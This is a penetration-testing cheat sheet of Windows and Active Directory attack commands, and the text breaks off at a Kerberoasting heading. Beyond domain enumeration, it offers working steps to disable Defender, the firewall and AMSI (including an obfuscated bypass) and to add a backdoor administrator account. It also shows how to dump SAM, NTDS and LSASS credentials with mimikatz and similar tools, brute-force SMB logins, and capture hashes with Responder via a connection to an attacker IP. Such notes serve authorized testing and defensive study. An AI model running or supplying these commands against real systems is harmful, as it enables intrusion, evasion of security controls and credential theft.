Local user & Group Enum
whoami /priv

whoami /groups

echo %USERNAME% || whoami
$env:username

Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name

net user UserName /domain

#Basic Group Enumeration
net localgroup
Get-LocalGroup | ft Name
net localgroup "Remote Management Users"

#Password Requirements
net accounts

#Create a New account
net user /add bhanu Bhanu@1234 
net localgroup administrators bhanu /add

#list domain controllers
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

#DC discovery 
nltest /server: any_server_IP /dclist: domain_name
net view /domain

#list the members of the domain
net view /domain: domain_name

# Get Remote Machine's MAC Address
nbtstat -A 10.10.10.10

#Find Shares
net use e: \\10.10.10.10\ipc$ P@%%W0rd! /user:steins.local\username
net view \\10.10.10.10

#List network shares
net view \\hostname

#Mount a share
net use z: \\hostname\sharename
z: 
net use z: \\hostname\share /user:domain\username password

Network Enumeration 
#Find the list of IP addresses
nbtscan -r 10.10.10.10/24

#reverse DNS queries to identify Hostnames 
nmap -sL 10.10.10.10/24

#List Name servers
dig -t NS domain_name

#list global catalog 
dig _gc. domain_name

#List all network interfaces, IP, and DNS.
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft

#List current routing table
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex

#List the ARP table
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State

#List all current connections
netstat -ano

#Get some info via community string
use auxiliary/scanner/snmp/snmp_login
snmpcheck.pl -c community_string -t 10.10.10.10

#Powershell Ping Sweep
1..255 | % {echo "192.168.1.$_"; ping -n 1 -w 100 192.168.1.$_} | Select-String ttl 

#List firewall state and current configuration
netsh advfirewall firewall dump

or 
netsh firewall show state
netsh firewall show config

#List firewall's blocked ports
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports

#Disable firewall
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off


#Disable AntiVirus/ Windows Defender/ Firewall
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
netsh advfirewall set allprofiles state off}

#Disable AMSI 
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

or 

[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

#Enable RDP on the target machine 
sc stop WinDefend
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
netsh firewall set service remoteadmin enable 
netsh firewall set service remotedesktop enable

proxychains rdesktop 10.10.10.10 -u Bhanu -p Bhanu@1234 

#List all network shares
net share

#SNMP Configuration
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

#DNS Sweep
for /L %i in (1,1,255) do @nslookup 10.10.10.%i [server to resolve 2>nul | find "Name" && echo 10.10.10.%i

#NetBIOS Sweep
for /L %i in (1,1,255) do @nbtstat A 10.10.10.%i 2>nul && echo 10.10.10.%i

#installing Powershell AD Module on a server 
Import Module ServerManager
Add-WindowsFeature RSAT-AD-PowerShell

Local Administrator Enumeration

#Find Remote server local admin users
([ADSI]'WinNT://computer_name/Administrators').psbase.Invoke('Members') |%{$_.GetType().InvokeMember('Name', 'GetProperty', $null, $_, $null)}

#Powerview - get local admin members
Get-NetLocalGroup -ComputerName computer_name

#Powerview - get local admin members using an API CALL
Get-NetLocalGroup -ComputerName computer_name - API

#Powerview - get local admin users recursively 
Get-NetLocalGroup -ComputerName computer_name -Recurse

Bruteforcing SMB Creds 

cat ips.txt | while read line 
do 
echo $line && rpcclient -U "Steins\username%P@ssword" -c "enumdomusers;quit" $line 
done

or 

cat usernames.txt | while read line; do echo $line && rpcclient -U "$user%P@ssword" -c "getusername;quit" 10.10.10.10; done

or 

python wmiexec.py domain/username:Passw0rd!@10.10.10.10 -dc-ip 10.10.10.1

Ldap Enumeration:
ldapsearch -x -h 10.10.10.10 -s base namingcontexts 

ldapsearch -x -h forest.htb.local -s sub -b 'DC=HTB,DC=LOCAL' | tee ldap_dump.txt


Dumping passwords using LDAP:

ldapsearch -x -h forest.htb.local -b 'DC=HTB,DC=LOCAL' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

ldapsearch -x -h 10.10.10.254 -D <<username>> -w <<password>> -b "dc=AJLAB,dc=COM" "(ms-MCS-AdmPwd=*)" ms-MSC-AdmPwd

Domain Enumeration with RPcclient
#Enum using Null Session
rpcclient -U "" 10.10.10.10

#Login as a user
rpcclient -U USERNAME //10.10.10.10

#Find Users in the domain 
rpcclient -Uuser_Name%PASSWORD -c enumdomusers 10.10.10.10

#Find Domian Info
rpcclient -Uuser_Name%PASSWORD -c querydominfo  10.10.10.10

#Find Groups and their Alias
rpcclient -Uuser_Name%PASSWORD -c "enumalsgroups builtin" 10.10.10.10

#Find more info using Alias and note SIDs
rpcclient -Uuser_Name%PASSWORD -c "queryaliasmem builtin 0x244" 10.10.10.10

#Find more info using SIDs
rpcclient $> lookupsids S-1-5-21-586154515854-343543654-8743952433-1105 

#Reset other Users Password
rpcclient -U user1 //10.10.10.10
setuserinfo2 USER2 23 'PASSWORD'


Enum using RPCClient

rpcclient -U DOMAIN\\Username 10.10.10.10   #Enter pass 

enumdomusers     #Enumerate Domain Users 

enumprivs        #Enum Privileges

enumprinters    #Enum Printers

srvinfo         #Server info

enumalsgroups domain    #List the domain groups 

enumalsgroups builtin    #list builtin groups

queryuser 500        #find Admin users

lookupnames username/groupname    #Find the SID of a user/group

Gaining Hashes from SAM/System

reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

impacket-secretsdump -sam SAM -system SYSTEM local
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL


Note: if the hash starts with 31d6, the password is either blank or the account is disabled. 

decrypt the hash from http://hashes.org/search.php

Login with the HASH:

smbmap -u USER_NAME -p WHAT_EVER:THE_HASH_IS -H IP_ADDRESS

pwdump SYSTEM SAM > sam.txt
samdump2 SYSTEM SAM -o sam.txt
john -format=NT sam.txt

Dumping Hashes using CME
Download CME from here

#Dump SAM Hashes 
cme smb 10.10.10.10/24 -u Username -p Password --sam

# Dump LSA
cme smb  10.10.10.10/24 -u Username -p Password  --lsa

#Dump ntds.dit from DC 
cme smb  10.10.10.10/24 -u Username -p Password --ntds

Dumping Credentials using mimikatz
mimikatz.exe 

privilege::debug          /You should see 200 OK

sekurlsa::logonpasswords     /dump creds and other info

lsadump::sam                 /Dump creds stored in LSa

sekurlsa::tickets            /view available tickets

sekurlsa::tickets /export    /Download all the tickets

or 

#Dumping Creds using Mimikatz Powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'

#collect the NTLM hashes and it can be cracked using john/hashcat or crackstation
hashcat -m 1000 -a 3 hashes.txt rockyou.txt
john --format=LM hashes.txt --wordlist=rockyou.txt

Dumping Creds if you find lsass.dmp
#Download procdump.exe on the target machine 
procdump.exe -accepteula -ma lsass.exe lsass.dmp
or
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS.EXE_PID> lsass.dmp full

mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full

Find Passwords in Registry

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server /v PasswordViewOnly"
vncpwd.exe PASSWORD_FROM_ABOVE

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

#Winscp
reg query "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP" 2\Sessions

To decrypt winscp keys,copy the username,hostname and encrypted password and use github-winscppassworddecrypt


# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s 

Credentials in Credential Manger 
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 

#run as admin using previously saved creds
runas /user:Administrator /noprofile /savecred "cmd.exe /c type C:\users\administrator\desktop\root.txt > C:\users\noob\root.txt"

List the websites visited by the Target

You can make use of Get-BrowserData.ps1 to list the websites

#if the user is authenticating to some website, you can use Invoke-Inveigh to capture the hashes. 

#command to start inveigh on the target machine 
Invoke-Inveigh -ConsoleOutput Y

#but you might not be able to get the hashes always, so one option is to setup a proxy on the target and capture the plantext creds 


Powershell Sudo For Windows

$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}' 

powershell -ExecutionPolicy Bypass -File xyz.ps1

Domain User Enum via Linux Box 

#Find User Principal Names from /etc/krb5.keytab or /etc/krb5/krb5.keytab
$ /usr/bin/ktutil
ktutil:  read_kt /etc/krb5.keytab
read_kt /etc/krb5.keytab
ktutil:  list

#Domain Enum usind adtool (/opt/pbis/bin/adtool)
#Get CN of a user; get login-as from above ktutil
/opt/pbis/bin/adtool --keytab=/etc/krb5.keytab --logon-as=Server$ -a search-user --name test.user -t 

#Get AD Attrinutes of a user 
/opt/pbis/bin/adtool --keytab=/etc/krb5.keytab --logon-as=Server$ -a lookup-object --attr=unixHomeDirectory --dn 'CN=test.user,DC=steins,DC=local'

#Look up "userAccountControl" attribute of a user with CN TestUserCN:
adtool -a search-user --name CN=TestUserCN -t | adtool -a lookup-object --dn=- --attr=userAccountControl

#Look up all attributes of an AD object using filter-based search:
adtool -a search-object --filter '(&(objectClass=person)(displayName=TestUser))' -t | adtool -a lookup-object

#Add user TestUser to group TestGroup:
adtool -a add-to-group --user TestUser --to-group=TestGroup

User Groups ID Info 

513: Domain Users
512: Domain Admins
518: Schema Admins
519: Enterprise Admins
520: Group Policy Creator Owners


Basic AD Enum After Initial Access using AD Module
#Get Domain Details
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
$ADclass::GetCurrentDomain()

#Loading AD Modules
Import-Module Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module ActiveDirectory.psd1 -Verbose

User Enumeration

#View all users in Domain
get-aduser

#View all user properties
get-aduser -Identity kyomah -Properties *

#ALL user Objects
Get-ADUser -Filter * -Properties * |select -First 1 | Get-Member -MemberType *Property | select Name

#Find Last Password set date
Get-ADUser -Filter * -Properties * |select name, @{expression={[datetime]::fromFileTime($_pwdlsatset)}}	

#View Account Descriptions to check for stored passwords
Get-ADUser -Filter 'Description -like "*pass*"' -Properties Description | select name,Description
Get-ADUser username -Properties * | Select Name,Description

#Finding user accounts used as Service accounts 
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

#Check Password Policy - Recommended to have 8 chars atleast
Get-ADDefaultDomainPasswordPolicy


Computer Enumeration

#view all computer names 
Get-ADComputer -Filter * | select name

#List the computers in the domain 
get-adcomputer -filter * -Properties ipv4address | where {$_.IPV4address} | select name,ipv4address 

#List details of a computer
get-adcomputer -filter {ipv4address -eq '10.10.10.10'} -Properties Lastlogondate,passwordlastset,ipv4address

#Find Windows 2012 Servers 
Get-ADComputer -Filter 'OperatingSystem -like "*2019*"' -Properties OperatingSystem | select Name,OperatingSystem

#Check if machines is online/pingable
Get-ADComputer -Filter * -Properties DNSHostName |%{Test-Connection -Count 1 -ComputerName $_.DNSHostName}

#Find the Computes by GroupID (Ex: DC = 516)
Get-ADComputer -Filter * -Property PrimaryGroupID| Out-GridView

#Find Specific Vulnerable Operating System
Get-ADComputer -Filter 'OperatingSystemVersion -eq "6.3 (9600)"'

#Find Machines which has TrustedForDelegation & TrustedtoAuthForDelegation enabled - Kerberos delegation
Get-ADComputer -filter {PrimaryGroupID -eq "515"} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation

User Groups Enumeration

#Find all groups in the Domain
Get-ADGroup  -Filter * |select name

#Get verbose info about groups 
Get-ADGroup  -Filter * -Properties *

#Find Complete info about specific group
Get-ADGroup -Identity 'Enterprise Admins' -Properties *
Get-ADGroup -Filter 'Name -like "*admin*"'| select Name 


Group Membership Enum

#Find the members of a group
Get-ADGroupMember -Identity 'Enterprise Admins' -Recursive | select SamAccountName

#Find the groups a user is member of
Get-ADPrincipalGroupMembership -Identity UserName | select name


GPO Enumeration:

#Get GPO list in current domain
Get-gpo -all

#Restricted policy
Get-NetGPOGroup

#Finding OUS
Get-ADOrganizationalUnit -Filter * -Properties *


Forest Enumeration

#Domain Trust Mapping
Get-ADTrust -Identity steins.local

#Forest Details
Get-ADForest
Get-AdForest -Identity Steins.local

#Get all domains in current forest
(Get-ADForest).Domains

#Get all Global catalogs for current forest
Get-ADForest | select  -ExpandProperty GlobalCatalogs

#Map Trusts of Forests
Get-ADTrust -Filter 'msDS-TrustForestTrustinfo -ne "$null"'

Basic AD Enum After Initial Access using PowerView
powershell.exe -ep bypass
SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
Import-Module ./PowerView.ps1

#Get the list of domains
Get-Domain

User Enumeration

#List the users in the domain 
Get-DomainUser
Get-DomainUser -Name User1

#Finding user accounts used as Service accounts
Get-NetUser -SPN 
Get-DomainUser -SPN

#Find Users with AdminCount 1 (Domain Admins Most Likley)
Get-NetUser -AdminCount

# retrieve all the computer dns host names a GPP password applies to
Get-DomainOU -GPLink '<GPP_GUID>' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}

# all disabled users
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"
Get-DomainUser -UACFilter ACCOUNTDISABLE

# check for users who don't have kerberos preauthentication set
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# find all service accounts in "Domain Admins"
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# find users with sidHistory set
Get-DomainUser -LDAPFilter '(sidHistory=*)'

# find any users/computers with constrained delegation st
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# enumerate all servers that allow unconstrained delegation, and all privileged users that aren't marked as sensitive/not for delegation
$Computers = Get-DomainComputer -Unconstrained
$Users = Get-DomainUser -AllowDelegation -AdminCount

# Kerberoast any users in a particular OU with SPNs set
Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"

# Find-DomainUserLocation == old Invoke-UserHunter
# enumerate servers that allow unconstrained Kerberos delegation and show all users logged in
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

# hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

# Get the logged on users for all machines in any *server* OU in a particular domain
Get-DomainOU -Identity *server* -Domain <domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}


Computer Enumeration
#View all the computers in the domain
Get-DomainComputer | Select name
Get-DomainComputer -Name dc.steins.local

#check connection to the computers in the domain
Get-DomainComputer -Ping

#View all the shares of the comupters
Find-DomainShare
Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC
Get-NetfileServer --help

#List all groups on a machine: 
Get-netlocalgroup -ComputerName steinsdc -ListGroups

#Find Computers where Domain admin (user/group) has sessions
Invoke-UserHunter -GroupName "RDPUsers"

#Find Computers where domain admin is logged in
Invoke-UserHunter -Stealth

#Find MSSQL Servers 
Get-NetComputer -SPN mssql*

# enumerate the current domain controller policy
$DCPolicy = Get-DomainPolicy -Policy DC
$DCPolicy.PrivilegeRights # user privilege rights on the dc...

# enumerate the current domain policy
$DomainPolicy = Get-DomainPolicy -Policy Domain
$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
$DomainPolicy.SystemAccess # password age/etc.

Group Enumeration
#Get all the groups in the current domain
Get-DomainGroup

#Get Groups members from a domain group
Get-DomainGroupMember -Name "Domain Admins" -Recurse

#Get all the groups a user is part of 
Get-DomainGroup -username "user2"

#List Local groups 
Get-NetLocalGroup -ComputerName computer_name -ListGroups
Get-NetLocalGroup -ComputerName computer_name -GroupName "Remote Desktop Users " -Recurse

#Get all the members of the Domain Admins group
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetGroupMember  -GroupName "Domain Admins" -Recurse
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain <DOmain name here>
Get-NetGroup "*Hyper*" | Get-NetGroupMember
Get-NetGroup "*VMWare*" | Get-NetGroupMember

#This group contains the following highly-privileged users and group
Get NetGroupMember -GroupName "Denied RODC Password Replication -Recurse

#Get the group membership for a user:
Get-DomainGroup –UserName "student1"

GPO Enumeration
#View Domain GPO
Get-DomainGPO | Select displayname 
Get-NetGPO
Get-NetGPO | select displayname,name,whenchanged

#Find the admins of a computer using GPO
Find-GPOComputerAdmin -ComputerName computer_name

#View the GPO policies for assigned for a computer 
Get-DomainGPO -ComputerName dc.steins.local

#Get the available global catalogs info - DC's info
Get-ForestGlobalCatalog

#Find machines where the given user is member of a specific group
Find-GPOLocation -UserName USERNAME -Verbose

#Find computers that the user has access local RDP access
Find-GPOLocation -UserName username -LocalGroup RDP

#Find the users who can modify GPO 
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}

#Find if a specific user can modify GPO
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}|where {$_.IdentityReferenc e -match "USERNAME"}

#Find groups with local admin rights
Get-NetGPOGroup
Get-NetGroupMember -GroupName "Local Admin"

#List all the OU's
Get-NetOU
Find-GPOComputerAdmin -OUName 'OU= X , Y , Z , W '
Get-NetComputer -ADSpath 'OU= X , Y , Z , W '

#Find administrator credentials in SYSVOL (can be decrypted)
\\Domain_Name\SYSVOL\Domain_Name\Policies\\

# enumerate what machines that a particular user/group identity has local admin rights to
#   Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# enumerate what machines that a given user in the specified domain has RDP access rights to
Get-DomainGPOUserLocalGroupMapping -Identity <USER> -Domain <DOMAIN> -LocalGroup RDP

# export a csv of all GPO mappings
Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
Share Enumeration
#Get all the shares in the domain 
Find-DomainShare -Verbose
Get-DomainFileServer -Verbose

Invoke-ShareFinder -Verbose
Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC

#Find Sensitive Files on computers in the domain
Invoke-FileFinder -Verbose 

#Search for file servers, high value targets: 
Get-NetfileServer -Verbose 

ACL Enumeration
#Get ACLs associated with the specified object 
Get-ObjectAcl -SamAccounntName USERNAME -ResolveGUIDs 

#Get the ACLs associated with the specified prefix 
Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -verbose 

#View a users ACls:
(Get-Acl 'AD:\CN=Houin Kyoma,CN=Users,DC=STEINS,DC=local').Access

#get the ACLs associated with the specified LDAP path to be used for search. 
Get-ObjectACL -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=DC,DC=Steins,DC=local" -ResolveGUIDs -Verbose 

#Search for interesting ACEs -write, modify 
Invoke-ACLScanner -ResolveGUIDs

#GenericWrite for all users > under advanced > Write all properties
Get-ObjectAcl -SamAccountName * –ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }

#retrieve more details on ExtendedRight,
Get-ObjectAcl -SamAccountName USER1 -ResolveGUIDs | ? {$_.IdentityReference -eq "steins.local\Highuser"}

#Find Users with GenericAll Permissions
Invoke-ACLScanner -ResolveGUIDs -ADSpath 'OU= X , Y , Z , W ' | Where {$_.ActiveDirectoryRights -eq 'GenericAll'}

# Check on which user - we have permission to modify/update
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "User1"}

#View the ACL's for GPO Permissions
Get-NetGPO | ForEach-Object {Get-ObjectAcl -ResolveGUIDs -Name $_.name} | Where-Object {$_.ActiveDirectoryRights -match 'WriteProperty'}

#Finding users with DCSync Rights
Get-ObjectACL -DistinguishedName "dc= steins , dc=local " -ResolveGUIDs | ? {($_.ObjectType match 'replication-get') or $_.ActiveDirectoryRights -match 'GenericAll') }

#View the ACL's for AdminSDHolder
Get-ObjectAcl -ADSprefix 'CN=AdminSDHolder,CN=System' -ResolveGUIDs | ?{$_.IdentityReference -match' SamAccountName1'}


Local Admin Enum

#Powerview - get local admin members
Get-NetLocalGroup -ComputerName computer_name

#Powerview - get local admin members using an API CALL
Get-NetLocalGroup -ComputerName computer_name - API

#Powerview - get local admin users recursively 
Get-NetLocalGroup -ComputerName computer_name -Recurse


Forest Enumeration

#Get Forest details - name and the domains inside it
Get-NetForest

#Euum all domains in the current forest
Get-NetForestDomain

#get the DC's list 
Get-NetDomain

#Find  domain controller that holds the PDC emulator FSMO role 
Get-ADForest |Select-Object -ExpandProperty RootDomain |Get-ADDomain | Select-Object -Property PDCEmulator
Get-NetDomain -Properties * | Select DomainControllers,PdcRoleOwner
Get-ForestGlobalCatalog

#Enum Current Domain Trusts
Get-NetUser -Domain domain_name

#Find admin groups across a trust.
Get-NetGroup *admin* -Domain Domian_Name

#Map all reachable domain trusts.
Invoke-MapDomainTrust
Invoke-MapDomainTrust -LDAP
Invoke-MapDomainTrust | Export-Csv -NoTypeInformation trusts.csv

#Find users in the current domain that reside in groups across a trust.
Find-ForeignUser
Find-ForeignGroup -Domain steins.local

#View Domain trusts
Get-NetDomainTrust

#Identifying Partner Organizations using Contacts #Powershell AD Module 
get-ADObject -filter {ObjectClass -eq "Contact"} -Prop *

# enumerate all domains in the current forest
Get-NetForestDomain

# map all reachable domain trusts
Invoke-MapDomainTrust

# map all reachable domain trusts through LDAP queries reflected through the current primary domain controller
Invoke-MapDomainTrust -LDAP

# export domain trust mappings for visualization
Invoke-MapDomainTrust | Export-Csv -NoTypeInformation trusts.csv

Enumerating Domain Trusts

nltest /domain_trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

#Powerview
Invoke-MapDomainTrust
Get-NetDomainTrust
Get-NetForestTrust

User Hunting 
creates lot of noise, incase SMB is disbaled, you can run the below  
https://jdhitsolutions.com/blog/wp-content/uploads/2011/07/get-wmiadmin.txt --> import the script

#Finding machines with local admin access as current user on current domain: 
Find-LocalAdminAccess -Verbose

#If SMB/RPC are closed on the servers, we can use Find-WMILocalAdminAccess.ps1

#get the list of computers in the domain. 
Get-NetComputer

#find local admin access on a list of computers 
Find-WMILocalAdminAccess -ComputerFile ./computers.txt -Verbose 

Find-WMILocalAdminAccess -ComputerName starkt

#Finding users with DCSync Rights
Get-ObjectACL -DistinguishedName "dc= steins , dc=local " -ResolveGUIDs | ? {($_.ObjectType match 'replication-get') or $_.ActiveDirectoryRights -match 'GenericAll') }

#View the ACL's for AdminSDHolder
Get-ObjectAcl -ADSprefix 'CN=AdminSDHolder,CN=System' -ResolveGUIDs | ?{$_.IdentityReference -match' SamAccountName1'}

PowerView
#Find local admins on all machines
Invoke-EnumerateLocalAdmin -Verbose 

#Find Admin accounts using AdminCount 
Get-NetUser -AdminCount | select name,whencreated,pwdlastset,lastlogon

#Find admin accounts of non-admin users
Get-NetGroupMember -GroupName 'Domain Admins' -FullData | %{ $a=$_.displayname.split('')[0..1] -join ' '; Get-NetUser -Filter "(displayname=*$a*)" } | Select Object -Property displayname,samaccountname

Find Computers where Domain admin (user/group) has sessions: below command gets Get-NetGroupMember & Get-NetComputer from DC and goes to each and every machines and lists their sessions and logged on users and tries to inject session.

#Find session of "domain admins" group on all the machines in the domain 
Invoke-UserHunter -Verbose

#Find session of domain admin on all the machines in a particular group
Invoke-UserHunter -GroupName "RDPUsers"

#Find Computers where domain admin is logged in: checks only high valued targets
#performs a  Get-NetSession against high traffic machines
Invoke-UserHunter -Stealth -ShowAll

#Find Domain users location in the domain 
Find-DomainUserLocation 

#Find the admins of a computer using GPO
Find-GPOComputerAdmin -ComputerName computer_name

Finding Administrators users/groups

#Find Admin accounts using AdminCount 
Get-NetUser -AdminCount | select name,whencreated,pwdlastset,lastlogon

#Find admin accounts of non-admin users
Get-NetGroupMember -GroupName 'Domain Admins' -FullData | %{ $a=$_.displayname.split('')[0..1] -join ' '; Get-NetUser -Filter "(displayname=*$a*)" } | Select Object -Property displayname,samaccountname

# find linked DA accounts using name correlation
Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}

#Find regular users with admin permissions
Get-NetGroup "*admins*" | Get-NetGroupMember -Recurse | ?{Get-NetUser $_.MemberName -filter '(mail=*)'}
Get-NetGroup "*admins*" | Get-NetGroupMember -Recurse | ?{$_.MemberName Like '*.*'}

#This group contains the following highly-privileged users and group
Get NetGroupMember -GroupName "Denied RODC Password Replication -Recurse

#Find Computers where domain admin is logged in: checks only high valued targets
#performs a  Get-NetSession against high traffic machines
Invoke-UserHunter -Stealth -ShowAll

#find local admin access on a list of computers 
Find-WMILocalAdminAccess -ComputerFile ./computers.txt -Verbose 
Find-WMILocalAdminAccess -ComputerName starkt

#Find the admins of a computer using GPO
Find-GPOComputerAdmin -ComputerName computer_name

#Finding machines with local admin access as current user on current domain: 
Find-LocalAdminAccess -Verbose

#Find computers that the user has access local RDP access
Find-GPOLocation -UserName username -LocalGroup RDP

#Get all the members of the Domain Admins group
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetGroupMember  -GroupName "Domain Admins" -Recurse

#finding Virutal Machine admins
Get-NetGroup "*Hyper*" | Get-NetGroupMember
Get-NetGroup "*VMWare*" | Get-NetGroupMember

#Find Identifying Computers Having Admin Rights
Get-NetGroup "*admins*" | Get-NetGroupMember -Recurse |?{$_.MemberName -Like '*$'}

#Groups with local admin access on Domain Controllers
Get-NetDomainController | Get-NetLocalGroup -Recurse

ACL AutoRecon

#Using ACLight
Import-Module .\ACLight2.psm1
Start-ACLsAnalysis

#Using Invoke-ACLPwn
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn 'Administrator'

Creds Sniffing when SMB Signing is not required/ Disbaled 
responder -I tun0 -F --lm -d -w -i KALI_IP

net use \\10.10.14.239    #on target machine or Access SMB 

OR 
responder -I tun0 -rPv 

#NTLMv2 Hash
hashcat -m 5600 hash ~/Downloads/rockyou.txt --force -r  /usr/share/hashcat/rules/d3ad0ne.rule

Running Commands as other user using powershell 
$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force 

$Cred = New-Object System.Management.Automation.PSCredential('Domain\UserName', $SecPassword) 

Get-aduser -Identity user1 -Credential $Cred

Kerberoasting 

Save the TGS ticket to the disk and brute force it. DC identifies the service account by ServicePrincipalName  but service accounts password are freaking hard to crack in most of the cases.

Find users with SPN's set to their Accounts
#import the module and Find the users 
Import-Module .\GetUserSPNs.ps1

or 
#AD module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

or 
#Poweview
Get-NetUser -SPN 

Get TGS Ticket Using GetUserSPNs.py
sudo GetUserSPNs.py -request -dc-ip 10.10.10.10 Steins.local/mark 

Get TGS Ticket Using AD Module 
